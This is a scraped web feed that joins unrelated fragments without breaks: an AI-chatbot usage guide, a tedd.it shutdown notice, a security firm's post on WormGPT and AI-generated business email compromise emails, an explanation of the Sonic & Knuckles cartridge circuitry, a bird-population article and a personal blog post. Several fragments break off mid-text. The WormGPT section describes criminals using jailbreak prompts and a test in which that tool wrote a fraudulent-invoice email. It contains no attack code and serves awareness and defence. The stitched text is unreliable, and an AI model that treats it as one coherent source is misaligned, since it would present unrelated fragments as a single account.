https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png" width="1456" height="848" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:848,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:388305,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p><span>The first four (including Bing) are all OpenAI systems. There are basically two major OpenAI AIs today: 3.5 and 4. The 3.5 model kicked off the current AI craze in November, the 4 model premiered in the Spring and is much more powerful. A new variation uses plugins to connect to the internet and other apps. There are a lot of plugins, most of which are not very useful, but you should feel free to explore them as needed. Code Interpreter as is an extremely powerful version of ChatGPT that can run Python programs. If you have never paid for OpenAI, you have only used 3.5. Aside from the plugins variation, and a temporarily suspended version of GPT-4 with browsing, none of these models are connected to the internet. Microsoft’s Bing uses a mix of 4 and 3.5, and is usually the first model in the GPT-4 family to roll out new features. For example, it can both create and view images, and it can read documents in the web browser. It is connected to the internet. </span><a href="https://oneusefulthing.substack.com/p/power-and-weirdness-how-to-use-bing" rel="">Bing is a bit weird to use, but powerful. </a></p><p>Google has been testing its own AI for consumer use, which they call Bard, but which is powered by a variety of Foundation Models, most recently one called PaLM 2. For the company that developed LLM technology, they have been pretty disappointing, although improvements announced yesterday show they are still working on the underlying technology, so I have hope. It has already gained the capability to run limited code and interpret images, but I would generally avoid it for now.</p><p>The final company, Anthropic has released Claude 2. Claude is most notable for having a very large context window - essentially the memory of the LLM. Claude can hold almost an entire book, or many PDFs,  in memory. It has been built to be less likely to act maliciously than other Large Language Models, which means, practically, that it tends to scold you a bit about stuff.</p><p>Now, on to some uses:</p><p><strong>Best free options:</strong><span> </span><a href="https://www.bing.com/search?q=Bing+AI&amp;showconv=1&amp;FORM=hpcodx" rel="">Bing </a><span>and </span><a href="https://claude.ai/" rel="">Claude 2</a><br><strong>Paid option: </strong><a href="https://chat.openai.com/chat" rel="">ChatGPT</a><span> 4.0/ChatGPT with plugins</span></p><p>For right now, GPT-4 is still the most capable AI tool for writing, which you can access at Bing (select“creative mode”) for free or by purchasing a $20/month subscription to ChatGPT. Claude, however, is a close second, and has a limited free option available.</p><p><span>These tools are also being integrated directly into common office applications. Microsoft Office will include a copilot powered by GPT and Google Docs will integrate suggestions from Bard. </span><a href="https://www.oneusefulthing.org/p/setting-time-on-fire-and-the-temptation" rel="">The implications of what these new innovations mean for writing are pretty profound.</a></p><p>Here are some ways to use AI to help you write.</p><ul><li><p><span>Writing drafts of anything. Blog posts, essays, promotional material, speeches, lectures, chose-you-own adventures, scripts, short stories - you name it, AI does it, and pretty well. All you have to do is prompt it. Prompt crafting is not magic, but basic prompts result in boring writing, </span><a href="https://www.oneusefulthing.org/p/on-boarding-your-ai-intern" rel="">but getting better at prompting is not that hard, just work interactively with the system.</a><span> You will find AI systems to be much more capable as writers with a little practice.</span></p></li><li><p>Make your writing better. Paste your text into an AI. Ask it to improve the content, or for suggestions about how to make it better for a particular audience. Ask it to create 10 drafts in radically different styles. Ask it to make things more vivid, or add examples. Use it to inspire you to do better work.</p></li><li><p><span>Help you with tasks. AI can do things you don’t have the time to do. Use it like an intern to write emails, create sales templates, give you next steps in a business plan, and a lot more. </span><a href="https://oneusefulthing.substack.com/p/superhuman-what-can-ai-do-in-30-minutes" rel="">Here is what I could accomplish with it in 30 minutes in supporting a product launch.</a></p></li><li><p><a href="https://oneusefulthing.substack.com/p/how-to-use-ai-to-unstick-yourself" rel="">Unblock yourself.</a><span> It is very easy to get distracted from a task by one difficult challenge.

Every fact or piece of information it tells you may be incorrect. You will need to check it all. Particularly dangerous is asking it for references, quotes, citations, and information for the internet (for the models that are not connected to the internet). Bing will usually hallucinate less than other models, because GPT-4 is generally more grounded and because Bing’s internet connection means it can actually pull in relevant facts. </span><a href="https://oneusefulthing.substack.com/p/how-to-get-an-ai-to-lie-to-you-in" rel="">Here is a guide to avoiding hallucinations</a><span>, but they are impossible to completely eliminate.</span></p><p>And also note that AI doesn’t explain itself, it only makes you think it does. If you ask it to explain why it wrote something, it will give you a plausible answer that is completely made up. When you ask it for its thought process, is not interrogating its own actions, it is just generating text that sounds like it is doing so.

<div id="readability-page-1" class="page"><div><h2>Tedd.it is Shutting Down</h2><h3>On August 1st, 2023, tedd.it will cease its operations and shut down permanently.</h3><p>With the <a href="https://www.theverge.com/2023/6/30/23779519/reddit-third-party-app-shut-down-apollo-sync-baconreader-api-protest">new restrictions on the Reddit API</a> taking place, tedd.it's access to Reddit and its content has been severely limited, effectively rendering the site unusable for more than a handful of users.
This is the cause for the "429 Too Many Requests" errors you see lately.</p><p>Sadly, tedd.it is just one more victim in a long list of <a href="https://www.theverge.com/2023/6/30/23779519/reddit-third-party-app-shut-down-apollo-sync-baconreader-api-protest">projects and apps killed</a> by the changes. This is a deliberate decision by Reddit, with the intent of killing content scrapers and third-party apps unless they pay <a href="https://www.theverge.com/2023/5/31/23743993/reddit-apollo-client-api-cost">enormous, unrealistic fees</a>, simply because they want to cut costs on their infrastructure to protect their bottom line.</p><p>This, unfortunately, leaves me with no choice but to shut down the site permanently. Tedd.it serves thousands of users every month, and is hosted, maintained, and paid for out of my own pocket. I cannot possibly afford the hundreds of thousands of dollars that Reddit now demands for access.</p><p>Reddit has proved once again that all it cares about is its profits and its upcoming IPO, and that it could not care less about its users, moderators, and content creators. To protect its corporate needs, Reddit <a href="https://9to5mac.com/2023/06/15/reddit-blackout-third-party-apps/">ignores community protests</a>, <a href="https://www.npr.org/2023/07/01/1184258201/reddit-api-accessibility-mods">harms accessibility for disabled users</a>, and <a href="https://futurism.com/the-byte/reddit-ceo-threatens-mods">threatens the volunteers who moderate the site</a>.</p><p>To the many users who found tedd.it useful, thank you for using the site.

<p>In this blog post, we delve into the emerging use of generative AI, including OpenAI’s ChatGPT, and the cybercrime tool WormGPT, in Business Email Compromise (BEC) attacks. Highlighting real cases from cybercrime forums, the post dives into the mechanics of these attacks, the inherent risks posed by AI-driven phishing emails, and the unique advantages of generative AI in facilitating such attacks.</p>
<h2><strong>How Generative AI is Revolutionising BEC Attacks</strong></h2>
<p>The progression of artificial intelligence (AI) technologies, such as OpenAI’s ChatGPT, has introduced a new vector for business email compromise (BEC) attacks. ChatGPT, a sophisticated AI model, generates human-like text based on the input it receives. Cybercriminals can use such technology to automate the creation of highly convincing fake emails, personalised to the recipient, thus increasing the chances of success for the attack.</p>
<p><img decoding="async" src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC.png" alt="Hackers Guide to Sending BEC" width="936" height="480" srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC-300x154.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC-768x394.png 768w" sizes="(max-width: 936px) 100vw, 936px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20480'%3E%3C/svg%3E" data-lazy-srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC-300x154.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC-768x394.png 768w" data-lazy-src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC.png"></p>
<p>Consider the first image above, where a recent discussion thread unfolded on a cybercrime forum. In this exchange, a cybercriminal showcased the potential of harnessing generative AI to refine an email that could be used in a phishing or BEC attack. They recommended composing the email in one’s native language, translating it, and then feeding it into an interface like ChatGPT to enhance its sophistication and formality. This method introduces a stark implication: attackers, even those lacking fluency in a particular language, are now more capable than ever of fabricating persuasive emails for phishing or BEC attacks.</p>
<p><img decoding="async" src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum.png" alt="Hackers Forum" width="936" height="492" srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum-300x158.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum-768x404.png 768w" sizes="(max-width: 936px) 100vw, 936px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20492'%3E%3C/svg%3E" data-lazy-srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum-300x158.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum-768x404.png 768w" data-lazy-src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum.png"></p>
<p>Moving on to the second image above, we’re now seeing an unsettling trend among cybercriminals on forums, evident in discussion threads offering “jailbreaks” for interfaces like ChatGPT. These “jailbreaks” are specialised prompts that are becoming increasingly common. They refer to carefully crafted inputs designed to manipulate interfaces like ChatGPT into generating output that might involve disclosing sensitive information, producing inappropriate content, or even executing harmful code. The proliferation of such practices underscores the rising challenges in maintaining AI security in the face of determined cybercriminals.</p>

<p>Finally, in the third image above, we see that malicious actors are now creating their own custom modules similar to ChatGPT, but easier to use for nefarious purposes. Not only are they creating these custom modules, but they are also advertising them to fellow bad actors. This shows how cybersecurity is becoming more challenging due to the increasing complexity and adaptability of these activities in a world shaped by AI.</p>
<h2><strong>Uncovering WormGPT: A Cybercriminal’s Arsenal</strong></h2>
<p>Our team recently gained access to a tool known as “WormGPT” through a prominent online forum that’s often associated with cybercrime. This tool presents itself as a blackhat alternative to GPT models, designed specifically for malicious activities.</p>

<p>As you can see in the screenshot above, we conducted tests focusing on BEC attacks to comprehensively assess the potential dangers associated with WormGPT. In one experiment, we instructed WormGPT to generate an email intended to pressure an unsuspecting account manager into paying a fraudulent invoice.</p>
<p>The results were unsettling. WormGPT produced an email that was not only remarkably persuasive but also strategically cunning, showcasing its potential for sophisticated phishing and BEC attacks.</p>
<p>In summary, it’s similar to ChatGPT but has no ethical boundaries or limitations. This experiment underscores the significant threat posed by generative AI technologies like WormGPT, even in the hands of novice cybercriminals.</p>
<h2><strong>Benefits of Using Generative AI for BEC Attacks</strong></h2>
<p>So, what specific advantages does using generative AI confer for BEC attacks?</p>
<p><strong>Exceptional Grammar:</strong> Generative AI can create emails with impeccable grammar, making them seem legitimate and reducing the likelihood of being flagged as suspicious.</p>
<p><strong>Lowered Entry Threshold:</strong> The use of generative AI democratises the execution of sophisticated BEC attacks. Even attackers with limited skills can use this technology, making it an accessible tool for a broader spectrum of cybercriminals.</p>
<h2><strong>Ways of Safeguarding Against AI-Driven BEC Attacks</strong></h2>
<p>In conclusion, the growth of AI, while beneficial, brings progressive, new attack vectors. Implementing strong preventative measures is crucial. Here are some strategies you can employ:</p>
<p><strong>BEC-Specific Training:</strong> Companies should develop extensive, regularly updated training programs aimed at countering BEC attacks, especially those enhanced by AI. Such programs should educate employees on the nature of BEC threats, how AI is used to augment them, and the tactics employed by attackers. This training should also be incorporated as a continuous aspect of employee professional development.</p>
<p><strong>Enhanced Email Verification Measures:</strong> To fortify against AI-driven BEC attacks, organisations should enforce stringent email verification processes. These include implementing systems that automatically alert when emails originating outside the organisation impersonate internal executives or vendors, and using email systems that flag messages containing specific keywords linked to BEC attacks like “urgent”, “sensitive”, or “wire transfer”. Such measures ensure that potentially malicious emails are subjected to thorough examination before any action is taken.</p>

<div id="readability-page-1" class="page"><div itemprop="text">
<blockquote>
<p>How does the Sonic &amp; Knuckles cart detect another cartridge?</p>
</blockquote>
<p>It checks the serial numbers of games; they can be found in the ROM's header. It probably detects all preceding Sonic the Hedgehog games since they all result in specific effects when locked-on.</p>
<blockquote>
<p>Are the game ROMs merged in some way when connected?</p>
</blockquote>
<p>It seems both games are simply mapped onto memory. This way, the executing game code gets access to the contents of both games.</p>
<p>To better understand what this means, imagine a Sonic &amp; Knuckles ROM with the complete contents of the Sonic the Hedgehog 3 ROM concatenated onto it.</p>
<p><img src="https://docs.google.com/drawings/d/1bYEZHBCZCIMGC-uvZuWg4jOaeyv7ZETZQe9PU88uJno/pub?w=1137&amp;h=573" alt="Sonic &amp; Knuckles and Sonic the Hedgehog 3"></p>
<p>The address space represents memory the game code can access. The contents of the <a href="https://en.wikipedia.org/wiki/Read-only_memory" rel="noreferrer">read-only memory</a> chips get <em>mapped</em> onto the Mega Drive's 68k processor's 24-bit address space. The Mega Drive just sees two games, one after another. Incidentally, that's what a good dump of Sonic 3 &amp; Knuckles looks like. This explains why the game works even in emulators that don't support any of the custom hardware inside the Sonic &amp; Knuckles cartridge.</p>
<p>Any game locked onto Sonic &amp; Knuckles will probably have its ROM mapped onto the game's address space the same way. This means game's data is <em>made available</em> for use by the Sonic &amp; Knuckles game code; it does <em>not</em> necessarily mean the data will be <em>used</em>. Since Sonic &amp; Knuckles was programmed to work with Sonic the Hedgehog 3, it makes extensive use of the data in the locked-on cartridge. Its handling of other games is far less sophisticated; apparently, it just uses the metadata found in the ROM's header to generate a unique Blue Spheres stage. If it detects that it's the first Sonic the Hedgehog game, it simply unlocks the full version of the bonus game.</p>
<p>The connection to Sonic the Hedgehog 2 works similarly:</p>
<p><img src="https://docs.google.com/drawings/d/e/2PACX-1vQeNKgjPpKN-m24msxznacQ-BTYkJQB62DQD0yopX6N0D0fO7CpZQstL5maNbfuASLW5TG8wtDWhMoy/pub?w=1137&amp;h=573" alt="Sonic &amp; Knuckles and Sonic the Hedgehog 3"></p>
<p>There are two ROM chips in the Sonic &amp; Knuckles cartridge: one has the main game and the other has a patch for Sonic the Hedgehog 2. The patch ROM contains the complete Knuckles the Echidna in Sonic the Hedgehog 2 game code; this is the full code for the original game but modified with the necessary game mechanics for Knuckles: lower speed, lower jump height, flight, wall climbing, etc. The ROM also contains new graphics data for Knuckles as well as new map data with places and items for Knuckles to reach with his abilities.</p>
<p>When Sonic &amp; Knuckles detects that Sonic the Hedgehog 2 is locked on, it passes control of the processor to the code inside the patch ROM, thereby launching Knuckles the Echidna in Sonic the Hedgehog 2. The new game can reuse much of the data from the original game: level graphics, enemy data, bosses, etc. The only code from the locked-on cartridge that executes is the sound driver.</p>
<blockquote>
<p>My question is, <strong>how</strong> exactly does the Lock-On Technology work?</p>
</blockquote>
<p>Let's delve into the details.</p>
<p>According to <a href="http://www.emulationzone.org/projects/s&amp;k/references.htm" rel="noreferrer">Lock-on Technology Hacking Guide</a>, there are some chips on the Sonic &amp; Knuckles cartridge:</p>
<ul>
<li><a href="http://i2c2p.twibright.com/datasheet/74HC_HCT74_3.pdf" rel="noreferrer">74HC74 Dual D-type Flip-Flop</a></li>
<li><a href="http://www.solarbotics.net/library/datasheets/74AC139.pdf" rel="noreferrer">74AC139 1-of-4 decoder/demultiplexer</a></li>
<li><a href="https://www.fairchildsemi.com/datasheets/74/74AC08.pdf" rel="noreferrer">74AC08 Quad 2-input AND Gate</a></li>
</ul>
<p>Along with the two ROM chips and the cartridge slot, they implement the Lock-On functionality.</p>
<p>Rizzo's photographs show what the cartridge's printed circuit board looks like:</p>
<p><a href="https://i.stack.imgur.com/fFdzL.jpg" rel="noreferrer"><img src="https://i.stack.imgur.com/fFdzL.jpg" alt="Sonic &amp; Knuckles cartridge printed circuit board, front"></a>
<a href="https://i.stack.imgur.com/Z7wso.jpg" rel="noreferrer"><img src="https://i.stack.imgur.com/Z7wso.jpg" alt="Sonic &amp; Knuckles cartridge printed circuit board, front"></a></p>
<p>The Mega Drive's cartridge I/O is meant for only one cartridge. However, a cartridge locked onto Sonic &amp; Knuckles forms a system that contains three ROM chips:</p>
<ul>
<li>Sonic &amp; Knuckles cartridge
<ul>
<li>Sonic &amp; Knuckles ROM <sub>2 MB</sub></li>
<li>Sonic the Hedgehog 2 patch ROM <sub>512 kB</sub>
<ul>
<li>Responsible for <a href="http://info.sonicretro.org/Knuckles_the_Echidna_in_Sonic_the_Hedgehog_2" rel="noreferrer">Knuckles the Echidna in Sonic the Hedgehog 2</a></li>
</ul>
</li>
</ul>
</li>
<li>Locked-on cartridge
<ul>
<li>Game ROM</li>
</ul>
</li>
</ul>
<p>Apparently, the key functionality behind Lock-On Technology is choosing one of those ROM chips and connecting it to the appropriate addressing lines of the Mega Drive which is none the wiser.</p>
<p>This memory bank switching is apparently achieved via the chip enable lines. They are active when logically <code>0</code> and if inactive will cause all memory addressing operations to be ignored and nothing to be returned on the data bus, effectively "disabling" the chip. If one of the ROMs is disabled, the other will be mapped in its place. The Mega Drive just sees a big cartridge with a big address space.</p>
<p>Rizzo also made a schematic of the electronics:</p>
<p><a href="https://i.stack.imgur.com/ESaiS.gif" rel="noreferrer"><img src="https://i.stack.imgur.com/ESaiS.gif" alt="Sonic &amp; Knuckles Lock-On schematics, full"></a></p>
<p>Even though I'm not an electronics expert, I was able to figure some things out by studying the schematics and reading the notes on the website. Here's what I learned.</p>
<h2>The 74HC74 Flip-Flop</h2>
<p>The purpose of this chip is to hold a single bit of information: is Sonic the Hedgehog 2 locked on? Much of the circuit's operation depends on this single bit. It is denoted by the red node on the schematic, corresponding to the 74HC74's <code>Q</code> output.</p>
<p>When Sonic &amp; Knuckles boots, it checks its cartridge slot. If there is a game locked on, it tests if its serial number matches that of earlier Sonic games. If it detects Sonic the Hedgehog 2, a signal is generated on the ROM's <code>D0</code> line, setting the <code>Q</code> bit of the 74HC74.</p>
<h2>The 74AC139 decoder/demultiplexer</h2>
<p>There are two independent decoders <code>M</code> and <code>N</code>, each with three inputs <code>E̅</code>, <code>SA</code> and <code>SB</code> as well as four outputs <code>Y0</code>, <code>Y1</code>, <code>Y2</code> and <code>Y3</code>. If <code>E̅</code> is <code>1</code>, all outputs are also forced to <code>1</code>.</p>
<p>The <code>Y</code> outputs obey the following truth table:</p>
<pre><code>E̅ SA SB Y0 Y1 Y2 Y3
1 -- --  1  1  1  1
0  0  0  0  1  1  1
0  1  0  1  0  1  1
0  0  1  1  1  0  1
0  1  1  1  1  1  0
</code></pre>
<h3>The I/O arrangement of each decoder</h3>
<p><code>M</code> is connected to to address line 20 and the output of the 74HC74 through <code>SA</code> and <code>SB</code> respectively; <code>E̅</code> is connected to the <code>Y3</code> output of <code>N</code>. The chip enable line of the Sonic the Hedgehog 2 patch ROM is connected to <code>Y3</code>, while <code>Y0</code>, <code>Y1</code> and <code>Y2</code> are all inputs to the 74AC08.</p>
<p><code>N</code> is connected to address line 21 through both <code>SA</code> and <code>SB</code>. The chip enable signal from Mega Drive is connected to <code>E̅</code>. The chip enable line of the Sonic &amp; Knuckles ROM is connected to <code>Y0</code> but <code>Y1</code> and <code>Y2</code> are not connected to anything at all. <code>Y3</code> is connected to <code>M</code>'s <code>E̅</code> input.</p>
<h3>Putting it all together</h3>
<p>Decoder <code>M</code> controls the activation of both the Sonic the Hedgehog 2 patch ROM and the locked-on cartridge's ROM. Decoder <code>N</code> controls the activation of the Sonic &amp; Knuckles ROM.</p>
<p>The A21 line addresses memory that is beyond the bounds of the game's 2 megabytes ROM. If this memory is accessed, the result is that the Sonic &amp; Knuckles ROM is disabled. Otherwise, it is enabled and <code>M</code>'s <code>E̅</code> is set.</p>
<p>The A20 line addresses memory that is within bounds; if that memory is accessed and the 74HC74 is also set, the Sonic the Hedgehog 2 patch ROM is enabled and the outputs to the 74AC08 are all <code>1</code>. If <code>M</code>'s <code>E̅</code> is set, the 74AC08 also receives all <code>1</code>s, but the patch ROM is not enabled.</p>
<h2>The 74AC08 AND Gates</h2>
<p>The 74AC08 has three inputs <code>Y0</code>, <code>Y1</code> and <code>Y2</code> as well as a single output that equals <code>Y0 ∧ Y1 ∧ Y2</code> and is connected to the locked-on cartridge's chip enable line. Therefore, the second cartridge's ROM will only be mapped when all its inputs are <code>1</code>:</p>
<ul>
<li>Locked-on cartridge is Sonic the Hedgehog 2</li>
<li>Sonic &amp; Knuckles ROM is enabled
<ul>
<li><code>M</code>'s <code>E̅</code> is set</li>
</ul>
</li>
</ul>

              <p><span>F</span>or weeks, Adam Smith had been crunching the raw data from more bird statistics than anyone had ever tried before—thirteen different bird counts and millions of radar sweeps. Suddenly he heard the musical chime that tells him his results are ready. He leaned across his desk, surrounded by enough high-powered computers to heat up his entire office, and stared at what could only be an impossible conclusion: Over the past fifty years, his calculations found, a third of North America’s birds had vanished. “Well, that can’t be right,” he thought. “I must have made a mistake somewhere.”</p><p>Smith, one of the hemisphere’s top specialists in bird populations, just sat for a while in his cluttered cubicle at the Canadian Wildlife Service, which was decorated with caribou antlers, a musk-ox skull, and early drawings from his twin boys. Then it dawned on him. “This would be a massive change, an absolutely profound change in the natural system,” he said. “And we weren’t even aware of it.”</p><figure><img decoding="async" width="800" height="410" alt="In Body Image" src="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-4.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1" srcset="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-4.png?q=65&amp;auto=format&amp;w=1600 800w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-4.png?q=65&amp;auto=format&amp;w=1200 600w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-4.png?q=65&amp;auto=format&amp;w=800 400w" loading="lazy"><figcaption><strong>GLOBE TROTTER:</strong> Teams of researchers in both South and North America are trying to protect the Cerulean Warbler, one of scores of tiny world-travelers whose ranges span the hemisphere. <em>Photo by Anders Gyllenhaal.</em></figcaption></figure><p>Up until that point, counting the abundance of individual birds throughout the entire continent was impossible. At any given time, many species number in the tens of millions in North America—adding up to billions of birds—and they’re constantly on the move. But the science of bird study was advancing, and a close-knit group of scientists was experimenting with using radar imagery, satellite photos, and citizen science to add precision to the dozens of conventional bird counts done for groups of species.</p><figure><img decoding="async" width="800" height="568" alt="In Body Image" src="https://assets.nautil.us/sites/3/nautilus/wib37u31-Gyllenhaal_BREAKER-8.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1" srcset="https://assets.nautil.us/sites/3/nautilus/wib37u31-Gyllenhaal_BREAKER-8.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1 800w,https://assets.nautil.us/sites/3/nautilus/wib37u31-Gyllenhaal_BREAKER-8.png?q=65&amp;auto=format&amp;w=1200 600w,https://assets.nautil.us/sites/3/nautilus/wib37u31-Gyllenhaal_BREAKER-8.png?q=65&amp;auto=format&amp;w=800 400w" loading="lazy"><figcaption><strong>CITIZEN SCIENCE:</strong> The Great Blue Heron, shown here with its decorous mating plumage, is one of the species most often reported by birders as part of the massive citizen science project powered by the eBird smartphone app. Photo by <em>Anders Gyllenhaal.</em></figcaption></figure><p>The computation Smith had just finished that day in May 2019 combined individual population estimates for 529 bird species, from the most common sparrows and robins to rarities hardly ever seen. When Smith pulled these estimates together and adjusted each for its degree of certainty, the findings came down to a single ski slope of a chart. It showed a precipitous drop in nearly all these species in every part of the continent. At the bottom sat four lone digits—2.913. That’s the number of breeding birds in billions that had disappeared since the early 1970s. He had documented an accelerating churn of seasonal losses that slowly took their toll on the abundance of birds. And it translated to an astounding third of the adult birds that not long ago filled North America but now are gone.</p><figure><img decoding="async" width="800" height="800" alt="In Body Image" src="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1" srcset="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1 800w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER.png?q=65&amp;auto=format&amp;w=1200 600w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER.png?q=65&amp;auto=format&amp;w=800 400w" loading="lazy"><figcaption><strong>BYE, BIRDS: </strong>The graphic that Adam Smith sent out to his fellow scientists, showing the seismic drop in bird populations over the past fifty years.&nbsp; <em>Credit: Adam Smith.</em></figcaption></figure><div><p>The hardest hit were grassland birds, down by more than 50 percent, mostly due to the expansion of farms that turn a varied landscape into acres of neat, plowed rows. That equates to 750 million birds, from bright yellow Eastern and Western Meadowlarks with their incessant morning songs to the stately Horned Lark with black masks across the male’s eyes and tiny hornlike feathers that sometimes stick up from their heads. Forest birds lost a third of their numbers, or 500 million, including the compact, colorful warblers and speckle-breasted Wood Thrushes that sing like flutes. Common backyard birds experienced a seismic decline. That’s where 90 percent of the total loss of abundance occurred, among just twelve families of the best-known birds—including sparrows, blackbirds, starlings, and finches. There’s been relatively little research on these species, and there’s no sense of urgency when resources are already stretched thin for so many other birds in more dire need.</p><p>The possibility of such losses was too startling to share with his colleagues until Smith checked every step of his calculations, particularly since he’d never attempted this <a href="https://par.nsf.gov/servlets/purl/10133018">analysis before</a>. “It always takes a couple of times to get these numbers right,” he said. After a day and a half of painstaking scrutiny, Smith realized there was no mistake. “I was speechless. We’ve lost almost 30 percent of an entire class of organisms in less than the span of a human lifetime, and we didn’t know it.”</p></div>

            <description><![CDATA[<p>URL: <a href="https://www.alexmolas.com/2023/07/15/nobody-cares-about-your-blog.html">https://www.alexmolas.com/2023/07/15/nobody-cares-about-your-blog.html</a>, See on <a href="https://news.ycombinator.com/item?id=36741620">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <p>I started writing on my blog some years ago, and since then I’ve had a lot of reasons to stop writing. Here’s a list of why nobody cares about your blog</p>

<ul>
  <li>Your blog is not original. There are hundreds of blogs out there, what makes you think yours is different? You’re just probably repeating things you’ve read in another place.</li>
  <li>You’re not an expert in your field, otherwise you wouldn’t be publishing in a blog, but writing papers and giving interviews.</li>
  <li>You are only showing the world how stupid you are. If what you say is not better than silence, you better shut up.</li>
  <li>If someone, at some point, cares about your blog will be only to criticize it. Your work is trash, and exposing it will make people notice you’re trash as well.</li>
</ul>

<p>But all of these things are not a problem, because you shouldn’t care even a little bit about what other think. Here are my reasons about why you should care about your blog</p>

<ul>
  <li>You can use it as notes to your future self. After some years you’ll have a nice journal of how you have evolved over the years. Rereading your old texts is like communicating with your past self.</li>
  <li>To release ideas that you have in your head and that you need to get out. Even if nobody else cares about them, writing them down can be a cathartic process.</li>
  <li>To learn to write and express complex ideas. The best way to learn is to teach (even if nobody is reading you). As Paul Graham says <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" rel="footnote">1</a></sup>, writing about something, even something you know well, usually shows you that you didn’t know it as well as you thought.</li>
  <li>Even if the ideas you’re sharing with the world aren’t original you can enrich them with your personal view. As Bill Thurson said <sup id="fnref:2" role="doc-noteref"><a href="#fn:2" rel="footnote">2</a></sup> all of us have clear understanding of a few things and murky concepts of many more. There is no way to run out of ideas in need of clarification.</li>
  <li>If you have lost time solving a superspecific problem then you need to write about it, it can happen that you end up being someone hero some day. It can also happen that you’ll have the same problem again and then you’ll be your own hero.</li>
  <li>It’s cool to maintain a blog, even it’s only from the technical perspective. The feeling of complete ownership over something is really fulfilling, even if it’s just some bytes on a remote server in this ethereal world.</li>
  <li>You can say whatever the fuck you want. It’s your blog, you don’t need to follow any rules. I just cursed and you can’t do nothing about it, because this is my blog and I do what I want. This will give you a sense of freedom that’s really cool imho.</li>
</ul>

<p>PS. I was just about to publish this post, and then I started to think “why should I publish this text? Who is going to loose their time to read this crap?”, but you know what? I just don’t care what you think, here’s my post and you can do nothing about it :)</p>

<div id="readability-page-1" class="page"><div id="s-lg-box-wrapper-25493140">
